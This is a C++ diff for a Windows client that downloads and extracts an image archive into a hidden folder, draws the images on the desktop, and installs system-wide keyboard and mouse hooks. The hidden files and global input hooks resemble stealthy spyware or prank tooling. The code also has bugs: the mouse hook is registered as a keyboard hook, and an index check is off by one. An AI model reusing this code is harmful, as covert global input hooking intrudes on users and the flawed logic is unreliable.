@@ -31,8 +31,9 @@ const char g_szWindowName[] = "BootstrapWindow";
 bool bQuit_ = false;
 
 #define WM_DRAW_PICTURE  WM_USER + 1000
-#define WM_CLEAN_PICTURE WM_DRAW_PICTURE + 1
-#define WM_DOWNLOAD_FINISHED WM_CLEAN_PICTURE + 1
+#define WM_CLEAN_PICTURE WM_USER + 1001
+#define WM_DOWNLOAD_FINISHED WM_USER + 1002
+
 
 
 #define SERVER_IP_ADDR "127.0.0.1"
@@ -52,6 +53,7 @@ bool bQuit_ = false;
 
 #define DOWNLOAD_FILE_NAME "pics.7z"
 #define DECODE_COMMAND_NAME "decode.exe"
+#define IMG_DIR_NAME "pictures"
 
 typedef struct client_status
 {
@@ -63,7 +65,9 @@ typedef struct client_status
 	FILE *downfile;
 	std::vector<std::string> file_list;
 	int draw_state;
-	HHOOK hook;
+	HHOOK keyboard_hook;
+	HHOOK mouse_hook;
+	int curr_img_index;
 }CLIENT_STATUS_T;
 
 CLIENT_STATUS_T client_status_ = { 0 };
@@ -87,11 +91,11 @@ void load_images()
 	char command[255] = { 0 };
 	memset(command, 0, sizeof(command));
 	strcpy(command, DECODE_COMMAND_NAME);
-	strcat(command, " e "DOWNLOAD_FILE_NAME" -o.\\pictures\\");
+	strcat(command, " e "DOWNLOAD_FILE_NAME" -o.\\"IMG_DIR_NAME"\\");
 	execute_command(command);
 	Sleep(500);
-	setFileHidden(".\\pictures");
-	client_status_.file_list = TraverseDirectory(".\\pictures");
+	setFileHidden(".\\"IMG_DIR_NAME);
+	client_status_.file_list = TraverseDirectory(".\\"IMG_DIR_NAME);
 	client_status_.draw_state = DRAW_STATE_FINISHED_LOAD_IMAGES;
 }
 
@@ -108,7 +112,17 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		PostQuitMessage(0);
 		break;
 	case WM_DRAW_PICTURE:
-		draw_picture_on_desktop("test.jpg");
+		if (client_status_.draw_state == DRAW_STATE_FINISHED_LOAD_IMAGES)
+		{
+			int index = client_status_.curr_img_index > client_status_.file_list.size() ? client_status_.file_list.size() - 1 : client_status_.curr_img_index;
+			if (index >= 0)
+			{
+				std::string name = client_status_.file_list[index];
+				std::string path = std::string(".\\"IMG_DIR_NAME"\\") + name;
+				draw_picture_on_desktop((char *)path.c_str());
+				client_status_.curr_img_index++;
+			}
+		}
 		break;
 	case WM_CLEAN_PICTURE:
 		clean_desktop_picture();
@@ -226,7 +240,8 @@ unsigned __stdcall networkProc(void* arg)
 
 void setWindowHooks()
 {
-	client_status_.hook = SetWindowsHookEx(WH_GETMESSAGE, myMsgHook,GetModuleHandle("wnd_hooks.dll"), 0);
+	client_status_.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD, MyKeyboardProc, GetModuleHandle("wnd_hooks.dll"), 0);
+	client_status_.mouse_hook = SetWindowsHookEx(WH_KEYBOARD, MyMouseProc, GetModuleHandle("wnd_hooks.dll"), 0);
 }
 
 
